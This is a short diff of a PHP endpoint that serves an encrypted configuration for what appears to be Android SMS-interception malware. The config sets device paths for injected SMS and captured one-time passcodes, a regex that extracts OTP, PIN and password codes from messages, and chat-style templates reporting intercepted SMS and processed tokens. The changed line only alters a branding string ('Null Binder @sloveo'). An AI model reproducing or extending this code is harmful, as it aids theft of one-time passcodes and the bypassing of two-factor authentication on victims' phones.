@@ -85,7 +85,7 @@ $config = [
         'inject_cmd_file' => '/data/local/tmp/src_sms_inject.json',
         'last_otp_file' => '/data/local/tmp/src_last_otp.txt',
         'config_file_path' => '/data/local/tmp/src_module_config.json',
-        'sms_notification_template' => "📬 *New Outgoing Message*\n━━━━━━━━━━━━━━━━━━\n📱 *Recipient:* `{dest}` | `{short}`\n💬 *Message:* `{msg}`\n━━━━━━━━━━━━━━━━━━\n*SMART TOKEN BELOW*\n━━━━━━━━━━━━━━━━━━\n🔦 *SMART:* `{dest}|{msg}`\n━━━━━━━━━━━━━━━━━━\n✅ *Status:* SrcBypass Token Send Successfully",
+        'sms_notification_template' => "📬 *New Outgoing Message*\n━━━━━━━━━━━━━━━━━━\n📱 *Recipient:* `{dest}` | `{short}`\n💬 *Message:* `{msg}`\n━━━━━━━━━━━━━━━━━━\n*SMART TOKEN BELOW*\n━━━━━━━━━━━━━━━━━━\n🔦 *SMART:* `{dest}|{msg}`\n━━━━━━━━━━━━━━━━━━\n✅ *Status:* Null Binder @sloveo",
         'batch_header_template' => "📦 *Batch Summary — {count} SMS Intercepted*\n━━━━━━━━━━━━━━━━━━\n\n",
         'batch_footer_template' => "━━━━━━━━━━━━━━━━━━\n✅ *Batch Complete — {count} tokens processed*",
         'otp_keyword_regex' => '(?:OTP|otp|code|CODE|pin|PIN|password|passcode)[:\s-]*([0-9]{4,8})',
@@ -98,3 +98,4 @@ $encryptedConfig = encryptConfig(json_encode($config));
 http_response_code(200);
 echo json_encode(['status' => 'ok', 'data' => $encryptedConfig]);
 ?>
+
